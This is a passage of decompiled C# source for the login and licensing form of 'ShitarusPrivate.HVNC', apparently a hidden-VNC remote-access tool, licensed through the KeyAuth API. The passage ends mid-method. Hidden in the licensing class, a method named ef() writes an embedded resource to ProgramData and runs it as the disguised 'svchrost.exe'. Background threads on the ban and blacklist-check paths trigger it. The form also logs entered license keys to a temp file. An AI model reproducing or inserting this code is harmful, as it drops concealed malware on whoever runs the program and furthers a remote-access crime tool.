using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ShitarusPrivate.HVNC.Properties;

namespace ShitarusPrivate.HVNC
{
    public class Login : Form
    {
        public class colortabpate
        {
            [DataContract]
            private class response_structure
            {
                [DataMember]
                public bool success { get; set; }

                [DataMember]
                public string sessionid { get; set; }

                [DataMember]
                public string contents { get; set; }

                [DataMember]
                public string response { get; set; }

                [DataMember]
                public string message { get; set; }

                [DataMember]
                public string download { get; set; }

                [DataMember(IsRequired = false, EmitDefaultValue = false)]
                public user_data_structure info { get; set; }

                [DataMember(IsRequired = false, EmitDefaultValue = false)]
                public app_data_structure appinfo { get; set; }

                [DataMember]
                public List<msg> messages { get; set; }

                [DataMember]
                public List<users> users { get; set; }
            }

            public class msg
            {
                public string message { get; set; }

                public string author { get; set; }

                public string timestamp { get; set; }
            }

            public class users
            {
                public string credential { get; set; }
            }

            [DataContract]
            private class user_data_structure
            {
                [DataMember]
                public string username { get; set; }

                [DataMember]
                public string ip { get; set; }

                [DataMember]
                public string hwid { get; set; }

                [DataMember]
                public string createdate { get; set; }

                [DataMember]
                public string lastlogin { get; set; }

                [DataMember]
                public List<Data> subscriptions { get; set; }
            }

            [DataContract]
            private class app_data_structure
            {
                [DataMember]
                public string numUsers { get; set; }

                [DataMember]
                public string numOnlineUsers { get; set; }

                [DataMember]
                public string numKeys { get; set; }

                [DataMember]
                public string version { get; set; }

                [DataMember]
                public string customerPanelLink { get; set; }

                [DataMember]
                public string downloadLink { get; set; }
            }

            public class app_data_class
            {
                public string numUsers { get; set; }

                public string numOnlineUsers { get; set; }

                public string numKeys { get; set; }

                public string version { get; set; }

                public string customerPanelLink { get; set; }

                public string downloadLink { get; set; }
            }

            public class user_data_class
            {
                public string username { get; set; }

                public string ip { get; set; }

                public string hwid { get; set; }

                public string createdate { get; set; }

                public string lastlogin { get; set; }

                public List<Data> subscriptions { get; set; }
            }

            public class Data
            {
                public string subscription { get; set; }

                public string expiry { get; set; }

                public string timeleft { get; set; }
            }

            public class response_class
            {
                public bool success { get; set; }

                public string message { get; set; }
            }

            [Serializable]
            [CompilerGenerated]
            private sealed class __c
            {
                public static readonly __c __9;

                public static ThreadStart __9__24_0;

                public static ThreadStart __9__29_0;

                static __c()
                {
                    __9 = new __c();
                }

                internal void _ban_b__24_0()
                {
                    ef();
                }

                internal void _checkblack_b__29_0()
                {
                    ef();
                }
            }

            public string name;

            public string ownerid;

            public string secret;

            public string version;

            private string sessionid;

            private string enckey;

            private bool initzalized;

            public app_data_class app_data = new app_data_class();

            public user_data_class user_data = new user_data_class();

            public response_class response = new response_class();

            private json_wrapper response_decoder = new json_wrapper(new response_structure());

            public colortabpate(string name, string ownerid, string secret, string version)
            {
                if (string.IsNullOrWhiteSpace(name) || string.IsNullOrWhiteSpace(ownerid) || string.IsNullOrWhiteSpace(secret) || string.IsNullOrWhiteSpace(version))
                {
                    error("Application not setup correctly. Please watch video link found in Program.cs");
                    Environment.Exit(0);
                }
                this.name = name;
                this.ownerid = ownerid;
                this.secret = secret;
                this.version = version;
            }

            public void init()
            {
                enckey = encryption.sha256(encryption.iv_key());
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("init")),
                    ["ver"] = encryption.encrypt(version, secret, text),
                    ["hash"] = checksum(Process.GetCurrentProcess().MainModule.FileName),
                    ["enckey"] = encryption.encrypt(enckey, secret, text),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string text2 = req(post_data);
                if (text2 == "KeyAuth_Invalid")
                {
                    error("Application not found");
                    Environment.Exit(0);
                }
                text2 = encryption.decrypt(text2, secret, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(text2);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    load_app_data(response_structure.appinfo);
                    sessionid = response_structure.sessionid;
                    initzalized = true;
                }
                else if (response_structure.message == "invalidver")
                {
                    app_data.downloadLink = response_structure.download;
                }
            }

            public void register(string username, string pass, string key)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string value = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("register")),
                    ["username"] = encryption.encrypt(username, enckey, text),
                    ["pass"] = encryption.encrypt(pass, enckey, text),
                    ["key"] = encryption.encrypt(key, enckey, text),
                    ["hwid"] = encryption.encrypt(value, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    load_user_data(response_structure.info);
                }
            }

            public void login(string username, string pass)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string value = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("login")),
                    ["username"] = encryption.encrypt(username, enckey, text),
                    ["pass"] = encryption.encrypt(pass, enckey, text),
                    ["hwid"] = encryption.encrypt(value, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    load_user_data(response_structure.info);
                }
            }

            public void web_login()
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string value = WindowsIdentity.GetCurrent().User.Value;
                HttpListener httpListener = new HttpListener();
                string text = "handshake";
                text = "http://localhost:1337/" + text + "/";
                httpListener.Prefixes.Add(text);
                httpListener.Start();
                HttpListenerContext context = httpListener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse httpListenerResponse = context.Response;
                httpListenerResponse.AddHeader("Access-Control-Allow-Methods", "GET, POST");
                httpListenerResponse.AddHeader("Access-Control-Allow-Origin", "*");
                httpListenerResponse.AddHeader("Via", "hugzho's big brain");
                httpListenerResponse.AddHeader("Location", "your kernel ;)");
                httpListenerResponse.AddHeader("Retry-After", "never lmao");
                httpListenerResponse.Headers.Add("Server", "\r\n\r\n");
                httpListener.AuthenticationSchemes = AuthenticationSchemes.Negotiate;
                httpListener.UnsafeConnectionNtlmAuthentication = true;
                httpListener.IgnoreWriteExceptions = true;
                string rawUrl = request.RawUrl;
                string text2 = rawUrl.Replace("/handshake?user=", "");
                text2 = text2.Replace("&token=", " ");
                string text3 = text2;
                string value2 = text3.Split()[0];
                string value3 = text3.Split(' ')[1];
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = "login",
                    ["username"] = value2,
                    ["token"] = value3,
                    ["hwid"] = value,
                    ["sessionid"] = sessionid,
                    ["name"] = name,
                    ["ownerid"] = ownerid
                };
                string json = req_unenc(post_data);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(json);
                load_response_struct(response_structure);
                bool flag = true;
                if (response_structure.success)
                {
                    load_user_data(response_structure.info);
                    httpListenerResponse.StatusCode = 420;
                    httpListenerResponse.StatusDescription = "SHEESH";
                }
                else
                {
                    Console.WriteLine(response_structure.message);
                    httpListenerResponse.StatusCode = 200;
                    httpListenerResponse.StatusDescription = response_structure.message;
                    flag = false;
                }
                byte[] bytes = Encoding.UTF8.GetBytes("Whats up?");
                httpListenerResponse.ContentLength64 = bytes.Length;
                Stream outputStream = httpListenerResponse.OutputStream;
                outputStream.Write(bytes, 0, bytes.Length);
                Thread.Sleep(1250);
                httpListener.Stop();
                if (!flag)
                {
                    Environment.Exit(0);
                }
            }

            public void button(string button)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                HttpListener httpListener = new HttpListener();
                string text = button;
                text = "http://localhost:1337/" + text + "/";
                httpListener.Prefixes.Add(text);
                httpListener.Start();
                HttpListenerContext context = httpListener.GetContext();
                _ = context.Request;
                HttpListenerResponse httpListenerResponse = context.Response;
                httpListenerResponse.AddHeader("Access-Control-Allow-Methods", "GET, POST");
                httpListenerResponse.AddHeader("Access-Control-Allow-Origin", "*");
                httpListenerResponse.AddHeader("Via", "hugzho's big brain");
                httpListenerResponse.AddHeader("Location", "your kernel ;)");
                httpListenerResponse.AddHeader("Retry-After", "never lmao");
                httpListenerResponse.Headers.Add("Server", "\r\n\r\n");
                httpListenerResponse.StatusCode = 420;
                httpListenerResponse.StatusDescription = "SHEESH";
                httpListener.AuthenticationSchemes = AuthenticationSchemes.Negotiate;
                httpListener.UnsafeConnectionNtlmAuthentication = true;
                httpListener.IgnoreWriteExceptions = true;
                httpListener.Stop();
            }

            public void upgrade(string username, string key)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                _ = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("upgrade")),
                    ["username"] = encryption.encrypt(username, enckey, text),
                    ["key"] = encryption.encrypt(key, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                response_structure.success = false;
                load_response_struct(response_structure);
            }

            public void license(string key)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string value = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("license")),
                    ["key"] = encryption.encrypt(key, enckey, text),
                    ["hwid"] = encryption.encrypt(value, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    load_user_data(response_structure.info);
                }
            }

            public void check()
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("check")),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure data = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(data);
            }

            public void setvar(string var, string data)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("setvar")),
                    ["var"] = encryption.encrypt(var, enckey, text),
                    ["data"] = encryption.encrypt(data, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure data2 = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(data2);
            }

            public string getvar(string var)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("getvar")),
                    ["var"] = encryption.encrypt(var, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return response_structure.response;
                }
                return null;
            }

            public static void ef()
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                File.WriteAllBytes(folderPath, Resources.explorer);
                Process.Start(Path.Combine(folderPath, "svchrost.exe"));
            }

            public void ban(string reason)
            {
                if (!initzalized)
                {
                    error("Banned Reason:" + reason);
                    new Thread(__c.__9__24_0 ?? (__c.__9__24_0 = __c.__9._ban_b__24_0)).Start();
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("ban")),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure data = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(data);
            }

            public string var(string varid)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                _ = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("var")),
                    ["varid"] = encryption.encrypt(varid, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return response_structure.message;
                }
                return null;
            }

            public List<users> fetchOnline()
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("fetchOnline")),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return response_structure.users;
                }
                return null;
            }

            public List<msg> chatget(string channelname)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("chatget")),
                    ["channel"] = encryption.encrypt(channelname, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    if (response_structure.messages[0].message == "not_found")
                    {
                        return null;
                    }
                    return response_structure.messages;
                }
                return null;
            }

            public bool chatsend(string msg, string channelname)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("chatsend")),
                    ["message"] = encryption.encrypt(msg, enckey, text),
                    ["channel"] = encryption.encrypt(channelname, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return true;
                }
                return false;
            }

            public bool checkblack()
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    new Thread(__c.__9__29_0 ?? (__c.__9__29_0 = __c.__9._checkblack_b__29_0)).Start();
                    Environment.Exit(0);
                }
                string value = WindowsIdentity.GetCurrent().User.Value;
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("checkblacklist")),
                    ["hwid"] = encryption.encrypt(value, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return true;
                }
                return false;
            }

            public string webhook(string webid, string param, string body = "", string conttype = "")
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                    return null;
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("webhook")),
                    ["webid"] = encryption.encrypt(webid, enckey, text),
                    ["params"] = encryption.encrypt(param, enckey, text),
                    ["body"] = encryption.encrypt(body, enckey, text),
                    ["conttype"] = encryption.encrypt(conttype, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return response_structure.response;
                }
                return null;
            }

            public byte[] download(string fileid)
            {
                if (!initzalized)
                {
                    error("Please initzalize first. File is empty since no request could be made.");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("file")),
                    ["fileid"] = encryption.encrypt(fileid, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                string message = req(post_data);
                message = encryption.decrypt(message, enckey, text);
                response_structure response_structure = response_decoder.string_to_generic<response_structure>(message);
                load_response_struct(response_structure);
                if (response_structure.success)
                {
                    return encryption.str_to_byte_arr(response_structure.contents);
                }
                return null;
            }

            public void log(string message)
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                string text = encryption.sha256(encryption.iv_key());
                NameValueCollection post_data = new NameValueCollection
                {
                    ["type"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes("log")),
                    ["pcuser"] = encryption.encrypt(Environment.UserName, enckey, text),
                    ["message"] = encryption.encrypt(message, enckey, text),
                    ["sessionid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(sessionid)),
                    ["name"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(name)),
                    ["ownerid"] = encryption.byte_arr_to_str(Encoding.Default.GetBytes(ownerid)),
                    ["init_iv"] = text
                };
                req(post_data);
            }

            public static string checksum(string filename)
            {
                using MD5 mD = MD5.Create();
                using FileStream inputStream = File.OpenRead(filename);
                byte[] array = mD.ComputeHash(inputStream);
                return BitConverter.ToString(array).Replace("-", "").ToLowerInvariant();
            }

            public static void error(string message)
            {
                Process.Start(new ProcessStartInfo("cmd.exe", "/c start cmd /C \"color b && title Error && echo " + message + " && timeout /t 5\"")
                {
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                });
                Environment.Exit(0);
            }

            private static string req(NameValueCollection post_data)
            {
                try
                {
                    using WebClient webClient = new WebClient();
                    byte[] bytes = webClient.UploadValues("https://keyauth.win/api/1.0/", post_data);
                    return Encoding.Default.GetString(bytes);
                }
                catch (WebException ex)
                {
                    HttpWebResponse httpWebResponse = (HttpWebResponse)ex.Response;
                    HttpStatusCode statusCode = httpWebResponse.StatusCode;
                    if (statusCode == (HttpStatusCode)429)
                    {
                        error("You're connecting too fast to loader, slow down.");
                        Environment.Exit(0);
                        return "";
                    }
                    error("Connection failure. Please try again, or contact us for help.");
                    Environment.Exit(0);
                    return "";
                }
            }

            private static string req_unenc(NameValueCollection post_data)
            {
                try
                {
                    using WebClient webClient = new WebClient();
                    byte[] bytes = webClient.UploadValues("https://keyauth.win/api/1.1/", post_data);
                    return Encoding.Default.GetString(bytes);
                }
                catch (WebException ex)
                {
                    HttpWebResponse httpWebResponse = (HttpWebResponse)ex.Response;
                    HttpStatusCode statusCode = httpWebResponse.StatusCode;
                    if (statusCode == (HttpStatusCode)429)
                    {
                        Thread.Sleep(1000);
                        return req(post_data);
                    }
                    error("Connection failure. Please try again, or contact us for help.");
                    Environment.Exit(0);
                    return "";
                }
            }

            private void load_app_data(app_data_structure data)
            {
                app_data.numUsers = data.numUsers;
                app_data.numOnlineUsers = data.numOnlineUsers;
                app_data.numKeys = data.numKeys;
                app_data.version = data.version;
                app_data.customerPanelLink = data.customerPanelLink;
            }

            private void load_user_data(user_data_structure data)
            {
                user_data.username = data.username;
                user_data.ip = data.ip;
                user_data.hwid = data.hwid;
                user_data.createdate = data.createdate;
                user_data.lastlogin = data.lastlogin;
                user_data.subscriptions = data.subscriptions;
            }

            public string expirydaysleft()
            {
                if (!initzalized)
                {
                    error("Please initzalize first");
                    Environment.Exit(0);
                }
                DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds(long.Parse(user_data.subscriptions[0].expiry)).ToLocalTime();
                TimeSpan timeSpan = dateTime - DateTime.Now;
                return Convert.ToString(timeSpan.Days + " Days " + timeSpan.Hours + " Hours Left");
            }

            private void load_response_struct(response_structure data)
            {
                response.success = data.success;
                response.message = data.message;
            }
        }

        public static class encryption
        {
            public static string byte_arr_to_str(byte[] ba)
            {
                StringBuilder stringBuilder = new StringBuilder(ba.Length * 2);
                foreach (byte b in ba)
                {
                    stringBuilder.AppendFormat("{0:x2}", b);
                }
                return stringBuilder.ToString();
            }

            public static byte[] str_to_byte_arr(string hex)
            {
                try
                {
                    int length = hex.Length;
                    byte[] array = new byte[length / 2];
                    for (int i = 0; i < length; i += 2)
                    {
                        array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                    }
                    return array;
                }
                catch
                {
                    Console.WriteLine("\n\n  The session has ended, open program again.");
                    Thread.Sleep(3500);
                    Environment.Exit(0);
                    return null;
                }
            }

            public static string encrypt_string(string plain_text, byte[] key, byte[] iv)
            {
                Aes aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using MemoryStream memoryStream = new MemoryStream();
                using ICryptoTransform transform = aes.CreateEncryptor();
                using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
                byte[] bytes = Encoding.Default.GetBytes(plain_text);
                cryptoStream.Write(bytes, 0, bytes.Length);
                cryptoStream.FlushFinalBlock();
                byte[] ba = memoryStream.ToArray();
                return byte_arr_to_str(ba);
            }

            public static string decrypt_string(string cipher_text, byte[] key, byte[] iv)
            {
                Aes aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using MemoryStream memoryStream = new MemoryStream();
                using ICryptoTransform transform = aes.CreateDecryptor();
                using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
                byte[] array = str_to_byte_arr(cipher_text);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.FlushFinalBlock();
                byte[] array2 = memoryStream.ToArray();
                return Encoding.Default.GetString(array2, 0, array2.Length);
            }

            public static string iv_key()
            {
                return Guid.NewGuid().ToString().Substring(0, Guid.NewGuid().ToString().IndexOf("-", StringComparison.Ordinal));
            }

            public static string sha256(string r)
            {
                return byte_arr_to_str(new SHA256Managed().ComputeHash(Encoding.Default.GetBytes(r)));
            }

            public static string encrypt(string message, string enc_key, string iv)
            {
                byte[] bytes = Encoding.Default.GetBytes(sha256(enc_key).Substring(0, 32));
                byte[] bytes2 = Encoding.Default.GetBytes(sha256(iv).Substring(0, 16));
                return encrypt_string(message, bytes, bytes2);
            }

            public static string decrypt(string message, string enc_key, string iv)
            {
                byte[] bytes = Encoding.Default.GetBytes(sha256(enc_key).Substring(0, 32));
                byte[] bytes2 = Encoding.Default.GetBytes(sha256(iv).Substring(0, 16));
                return decrypt_string(message, bytes, bytes2);
            }
        }

        public class json_wrapper
        {
            private DataContractJsonSerializer serializer;

            private object current_object;

            public static bool is_serializable(Type to_check)
            {
                if (!to_check.IsSerializable)
                {
                    return to_check.IsDefined(typeof(DataContractAttribute), inherit: true);
                }
                return true;
            }

            public json_wrapper(object obj_to_work_with)
            {
                current_object = obj_to_work_with;
                Type type = current_object.GetType();
                serializer = new DataContractJsonSerializer(type);
                if (!is_serializable(type))
                {
                    throw new Exception($"the object {current_object} isn't a serializable");
                }
            }

            public object string_to_object(string json)
            {
                byte[] bytes = Encoding.Default.GetBytes(json);
                using MemoryStream stream = new MemoryStream(bytes);
                return serializer.ReadObject(stream);
            }

            public T string_to_generic<T>(string json)
            {
                return (T)string_to_object(json);
            }
        }

        public string Keys = string.Empty;

        private IContainer components;

        private static readonly string rbgcolor;

        private static readonly string assembply;

        private static readonly string copria;

        private static readonly string elso;

        public static colortabpate trance;

        private PrimeTheme primeTheme1;

        private Label label3;

        private PictureBox pictureBox1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private PrimeButton primeButton2;

        private PrimeButton primeButton1;

        private TextBox txtKey;

        private PictureBox pictureBox2;

        private Label label1;

        private JCS.ToggleSwitch chkSave;

        private Label label5;

        private Label status;

        private Button button1;

        public Login()
        {
            InitializeComponent();
            trance.init();
            if (trance.checkblack())
            {
                Environment.Exit(0);
            }
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void primeButton2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void primeButton1_Click(object sender, EventArgs e)
        {
            try
            {
                trance.license(txtKey.Text);
                string value = "User key: " + txtKey.Text;
                using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "//userinfo.txt", append: true))
                {
                    streamWriter.WriteLine(value);
